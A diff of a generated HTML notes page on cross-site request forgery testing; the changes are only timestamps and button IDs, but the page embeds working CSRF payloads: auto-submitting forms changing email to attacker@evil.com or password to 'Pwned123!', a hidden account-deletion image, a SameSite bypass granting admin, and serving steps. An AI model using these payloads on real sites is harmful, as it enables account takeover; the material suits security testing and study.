@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:14 -->
+<!-- 2026-07-30 Thu 22:23 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Cross-Site Request Forgery</title>
@@ -928,11 +928,11 @@ Related: <a href="20260207T065314--cross-site-scripting__cybersecurity_technique
 <h2 id="orgd945ade">1. Identifying CSRF Candidates</h2>
 <div class="outline-text-2" id="text-orgd945ade">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_fa4ce2bf9c7e44779f939262eef9c69a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_49037047b4344f5db4642636d4229ddf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_fa4ce2bf9c7e44779f939262eef9c69a=document.querySelector('button[name=btn_fa4ce2bf9c7e44779f939262eef9c69a]');
-copyBtnbtn_fa4ce2bf9c7e44779f939262eef9c69a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`Look for state-changing actions without CSRF protection:\n- Password / email change\n- Account deletion\n- Fund transfer / order placement\n- Admin actions (user creation, privilege changes)\n- Settings updates\n\nSigns of CSRF token absence:\n- No hidden token field in forms\n- No X-CSRF-Token / X-Requested-With header in requests\n- Token present but not validated (same token works repeatedly)\n- Token present but not tied to session (any valid token accepted)\n`);copyBtnbtn_fa4ce2bf9c7e44779f939262eef9c69a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fa4ce2bf9c7e44779f939262eef9c69a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_49037047b4344f5db4642636d4229ddf=document.querySelector('button[name=btn_49037047b4344f5db4642636d4229ddf]');
+copyBtnbtn_49037047b4344f5db4642636d4229ddf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`Look for state-changing actions without CSRF protection:\n- Password / email change\n- Account deletion\n- Fund transfer / order placement\n- Admin actions (user creation, privilege changes)\n- Settings updates\n\nSigns of CSRF token absence:\n- No hidden token field in forms\n- No X-CSRF-Token / X-Requested-With header in requests\n- Token present but not validated (same token works repeatedly)\n- Token present but not tied to session (any valid token accepted)\n`);copyBtnbtn_49037047b4344f5db4642636d4229ddf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_49037047b4344f5db4642636d4229ddf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -966,11 +966,11 @@ action still succeeds, CSRF protection is absent or broken.
 <h3 id="orgbb081f8">POST Form — Auto-Submit</h3>
 <div class="outline-text-3" id="text-orgbb081f8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_6634ee17f2ad427799b5a3ecf3280eb9>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_8ab99078a7ee4ad294f27e753e344a37>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6634ee17f2ad427799b5a3ecf3280eb9=document.querySelector('button[name=btn_6634ee17f2ad427799b5a3ecf3280eb9]');
-copyBtnbtn_6634ee17f2ad427799b5a3ecf3280eb9.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<html>\n  <body>\n    <form id=\"csrf\" action=\"https://target.com/account/change-email\"\n          method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n    </form>\n    <script>document.getElementById('csrf').submit();</script>\n  </body>\n</html>\n`);copyBtnbtn_6634ee17f2ad427799b5a3ecf3280eb9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6634ee17f2ad427799b5a3ecf3280eb9.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8ab99078a7ee4ad294f27e753e344a37=document.querySelector('button[name=btn_8ab99078a7ee4ad294f27e753e344a37]');
+copyBtnbtn_8ab99078a7ee4ad294f27e753e344a37.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<html>\n  <body>\n    <form id=\"csrf\" action=\"https://target.com/account/change-email\"\n          method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n    </form>\n    <script>document.getElementById('csrf').submit();</script>\n  </body>\n</html>\n`);copyBtnbtn_8ab99078a7ee4ad294f27e753e344a37.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8ab99078a7ee4ad294f27e753e344a37.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -991,11 +991,11 @@ let res = copyTextToClipboard(`<html>\n  <body>\n    <form id=\"csrf\" action=\"
 <h3 id="org72dc077">GET Request — Image Tag</h3>
 <div class="outline-text-3" id="text-org72dc077">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_9cb1567b896c4290ace1cc7de5f42324>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_a12e0d89d6ed48378eb30e96fb6bcf5a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_9cb1567b896c4290ace1cc7de5f42324=document.querySelector('button[name=btn_9cb1567b896c4290ace1cc7de5f42324]');
-copyBtnbtn_9cb1567b896c4290ace1cc7de5f42324.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- State-changing GET is exploitable without form -->\n<img src=\"https://target.com/account/delete?confirm=true\"\n     style=\"display:none\">\n`);copyBtnbtn_9cb1567b896c4290ace1cc7de5f42324.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9cb1567b896c4290ace1cc7de5f42324.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a12e0d89d6ed48378eb30e96fb6bcf5a=document.querySelector('button[name=btn_a12e0d89d6ed48378eb30e96fb6bcf5a]');
+copyBtnbtn_a12e0d89d6ed48378eb30e96fb6bcf5a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- State-changing GET is exploitable without form -->\n<img src=\"https://target.com/account/delete?confirm=true\"\n     style=\"display:none\">\n`);copyBtnbtn_a12e0d89d6ed48378eb30e96fb6bcf5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a12e0d89d6ed48378eb30e96fb6bcf5a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1021,11 +1021,11 @@ Exception: if the server accepts <code>text/plain</code> with JSON body:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_46f8649100bd4d279dcad29f9f1b6d48>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_44931780e0c949b196b673c6b51e514d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_46f8649100bd4d279dcad29f9f1b6d48=document.querySelector('button[name=btn_46f8649100bd4d279dcad29f9f1b6d48]');
-copyBtnbtn_46f8649100bd4d279dcad29f9f1b6d48.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<html>\n  <body>\n    <form id=\"csrf\" action=\"https://target.com/api/settings\"\n          method=\"POST\" enctype=\"text/plain\">\n      <!-- name=value becomes the POST body -->\n      <!-- Craft so that value parses as valid JSON -->\n      <input type=\"hidden\" name='{\"email\":\"attacker@evil.com\",\"x\"' value='\"}'>\n    </form>\n    <script>document.getElementById('csrf').submit();</script>\n  </body>\n</html>\n`);copyBtnbtn_46f8649100bd4d279dcad29f9f1b6d48.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_46f8649100bd4d279dcad29f9f1b6d48.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_44931780e0c949b196b673c6b51e514d=document.querySelector('button[name=btn_44931780e0c949b196b673c6b51e514d]');
+copyBtnbtn_44931780e0c949b196b673c6b51e514d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<html>\n  <body>\n    <form id=\"csrf\" action=\"https://target.com/api/settings\"\n          method=\"POST\" enctype=\"text/plain\">\n      <!-- name=value becomes the POST body -->\n      <!-- Craft so that value parses as valid JSON -->\n      <input type=\"hidden\" name='{\"email\":\"attacker@evil.com\",\"x\"' value='\"}'>\n    </form>\n    <script>document.getElementById('csrf').submit();</script>\n  </body>\n</html>\n`);copyBtnbtn_44931780e0c949b196b673c6b51e514d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_44931780e0c949b196b673c6b51e514d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1054,11 +1054,11 @@ is properly protected:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_232abd8f0665408ebea3b76858bc6149>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_8998bc7d10d64b09baf71edcbd3ba475>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_232abd8f0665408ebea3b76858bc6149=document.querySelector('button[name=btn_232abd8f0665408ebea3b76858bc6149]');
-copyBtnbtn_232abd8f0665408ebea3b76858bc6149.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Remove the token entirely — if action succeeds, token not validated\n2. Use an empty token value — token= or token=null\n3. Use another user's valid token — if accepted, token not tied to session\n4. Change request method — if POST is protected, try GET with same params\n5. Change Content-Type — if JSON is checked, try form-encoded\n6. Remove the token parameter entirely (not just blank the value)\n`);copyBtnbtn_232abd8f0665408ebea3b76858bc6149.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_232abd8f0665408ebea3b76858bc6149.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8998bc7d10d64b09baf71edcbd3ba475=document.querySelector('button[name=btn_8998bc7d10d64b09baf71edcbd3ba475]');
+copyBtnbtn_8998bc7d10d64b09baf71edcbd3ba475.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Remove the token entirely — if action succeeds, token not validated\n2. Use an empty token value — token= or token=null\n3. Use another user's valid token — if accepted, token not tied to session\n4. Change request method — if POST is protected, try GET with same params\n5. Change Content-Type — if JSON is checked, try form-encoded\n6. Remove the token parameter entirely (not just blank the value)\n`);copyBtnbtn_8998bc7d10d64b09baf71edcbd3ba475.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8998bc7d10d64b09baf71edcbd3ba475.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1072,11 +1072,11 @@ let res = copyTextToClipboard(`1. Remove the token entirely — if action succee
 </div></div>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8063137d4d1a43ebb9af7b5bab0b9367>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9286582363e447f1b1aa9490bf0d27f7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8063137d4d1a43ebb9af7b5bab0b9367=document.querySelector('button[name=btn_8063137d4d1a43ebb9af7b5bab0b9367]');
-copyBtnbtn_8063137d4d1a43ebb9af7b5bab0b9367.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# In Burp Repeater — test each:\n# Original: POST /change-email  token=abc123&email=new@email.com\n# Test 1:   POST /change-email  email=new@email.com\n# Test 2:   POST /change-email  token=&email=new@email.com\n# Test 3:   POST /change-email  token=OTHER_USER_TOKEN&email=new@email.com\n# Test 4:   GET  /change-email?token=abc123&email=new@email.com\n`);copyBtnbtn_8063137d4d1a43ebb9af7b5bab0b9367.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8063137d4d1a43ebb9af7b5bab0b9367.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9286582363e447f1b1aa9490bf0d27f7=document.querySelector('button[name=btn_9286582363e447f1b1aa9490bf0d27f7]');
+copyBtnbtn_9286582363e447f1b1aa9490bf0d27f7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# In Burp Repeater — test each:\n# Original: POST /change-email  token=abc123&email=new@email.com\n# Test 1:   POST /change-email  email=new@email.com\n# Test 2:   POST /change-email  token=&email=new@email.com\n# Test 3:   POST /change-email  token=OTHER_USER_TOKEN&email=new@email.com\n# Test 4:   GET  /change-email?token=abc123&email=new@email.com\n`);copyBtnbtn_9286582363e447f1b1aa9490bf0d27f7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9286582363e447f1b1aa9490bf0d27f7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1143,11 +1143,11 @@ POST but permits top-level GET navigation. Test accordingly:
 </table>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_8926d43800f64bccaabb9e5b1ede63b6>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_5db5af9d045e4484b592e87528c239f3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8926d43800f64bccaabb9e5b1ede63b6=document.querySelector('button[name=btn_8926d43800f64bccaabb9e5b1ede63b6]');
-copyBtnbtn_8926d43800f64bccaabb9e5b1ede63b6.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- SameSite=Lax bypass — top-level GET navigation -->\n<!-- Works if the state-changing action accepts GET -->\n<a href=\"https://target.com/promote?user=attacker&role=admin\">Click here</a>\n\n<!-- Or redirect automatically -->\n<script>\n  window.location = \"https://target.com/promote?user=attacker&role=admin\";\n</script>\n`);copyBtnbtn_8926d43800f64bccaabb9e5b1ede63b6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8926d43800f64bccaabb9e5b1ede63b6.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5db5af9d045e4484b592e87528c239f3=document.querySelector('button[name=btn_5db5af9d045e4484b592e87528c239f3]');
+copyBtnbtn_5db5af9d045e4484b592e87528c239f3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- SameSite=Lax bypass — top-level GET navigation -->\n<!-- Works if the state-changing action accepts GET -->\n<a href=\"https://target.com/promote?user=attacker&role=admin\">Click here</a>\n\n<!-- Or redirect automatically -->\n<script>\n  window.location = \"https://target.com/promote?user=attacker&role=admin\";\n</script>\n`);copyBtnbtn_5db5af9d045e4484b592e87528c239f3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5db5af9d045e4484b592e87528c239f3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1172,11 +1172,11 @@ Host this on your attacker server and send the URL to the victim
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_634d15ccfac24b9faa69195eb9f76079>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_dbe0e2c156f34a03954e8a918d2bd27c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_634d15ccfac24b9faa69195eb9f76079=document.querySelector('button[name=btn_634d15ccfac24b9faa69195eb9f76079]');
-copyBtnbtn_634d15ccfac24b9faa69195eb9f76079.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</title></head>\n<body onload=\"document.getElementById('csrf').submit()\">\n  <h1>Page Loading...</h1>\n  <form id=\"csrf\"\n        action=\"https://TARGET/account/change-password\"\n        method=\"POST\"\n        style=\"display:none\">\n    <input type=\"hidden\" name=\"new_password\" value=\"Pwned123!\">\n    <input type=\"hidden\" name=\"confirm_password\" value=\"Pwned123!\">\n  </form>\n</body>\n</html>\n`);copyBtnbtn_634d15ccfac24b9faa69195eb9f76079.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_634d15ccfac24b9faa69195eb9f76079.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_dbe0e2c156f34a03954e8a918d2bd27c=document.querySelector('button[name=btn_dbe0e2c156f34a03954e8a918d2bd27c]');
+copyBtnbtn_dbe0e2c156f34a03954e8a918d2bd27c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</title></head>\n<body onload=\"document.getElementById('csrf').submit()\">\n  <h1>Page Loading...</h1>\n  <form id=\"csrf\"\n        action=\"https://TARGET/account/change-password\"\n        method=\"POST\"\n        style=\"display:none\">\n    <input type=\"hidden\" name=\"new_password\" value=\"Pwned123!\">\n    <input type=\"hidden\" name=\"confirm_password\" value=\"Pwned123!\">\n  </form>\n</body>\n</html>\n`);copyBtnbtn_dbe0e2c156f34a03954e8a918d2bd27c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dbe0e2c156f34a03954e8a918d2bd27c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1198,11 +1198,11 @@ let res = copyTextToClipboard(`<!DOCTYPE html>\n<html>\n<head><title>CSRF PoC</t
 </div></div>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f720f47562554c0595a7197e5500e8d3>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e412fa350ca9461ba19950a57f30eae6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f720f47562554c0595a7197e5500e8d3=document.querySelector('button[name=btn_f720f47562554c0595a7197e5500e8d3]');
-copyBtnbtn_f720f47562554c0595a7197e5500e8d3.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Serve from attacker machine\npython3 -m http.server 8080\n# Visit http://$ATTACKER:8080/csrf.html while authenticated on target\n`);copyBtnbtn_f720f47562554c0595a7197e5500e8d3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f720f47562554c0595a7197e5500e8d3.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e412fa350ca9461ba19950a57f30eae6=document.querySelector('button[name=btn_e412fa350ca9461ba19950a57f30eae6]');
+copyBtnbtn_e412fa350ca9461ba19950a57f30eae6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Serve from attacker machine\npython3 -m http.server 8080\n# Visit http://$ATTACKER:8080/csrf.html while authenticated on target\n`);copyBtnbtn_e412fa350ca9461ba19950a57f30eae6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e412fa350ca9461ba19950a57f30eae6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1221,11 +1221,11 @@ Burp can generate the PoC HTML automatically:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_f6493cef80874eea89abf1d2185564b4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_0d3b9ef2f0964d50bfbc283e148f030c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f6493cef80874eea89abf1d2185564b4=document.querySelector('button[name=btn_f6493cef80874eea89abf1d2185564b4]');
-copyBtnbtn_f6493cef80874eea89abf1d2185564b4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Intercept the state-changing request in Proxy\n2. Right-click → Engagement tools → Generate CSRF PoC\n3. Copy the generated HTML\n4. Test in browser while authenticated to target\n`);copyBtnbtn_f6493cef80874eea89abf1d2185564b4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f6493cef80874eea89abf1d2185564b4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0d3b9ef2f0964d50bfbc283e148f030c=document.querySelector('button[name=btn_0d3b9ef2f0964d50bfbc283e148f030c]');
+copyBtnbtn_0d3b9ef2f0964d50bfbc283e148f030c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Intercept the state-changing request in Proxy\n2. Right-click → Engagement tools → Generate CSRF PoC\n3. Copy the generated HTML\n4. Test in browser while authenticated to target\n`);copyBtnbtn_0d3b9ef2f0964d50bfbc283e148f030c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0d3b9ef2f0964d50bfbc283e148f030c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1261,7 +1261,7 @@ their knowledge or consent.
 <p>
 <b>Evidence:</b>
 </p>
-<pre class="example" id="orga6a8f50">
+<pre class="example" id="org37b249d">
 # Forged request succeeds without token
 POST /account/change-email HTTP/1.1
 Host: target.com
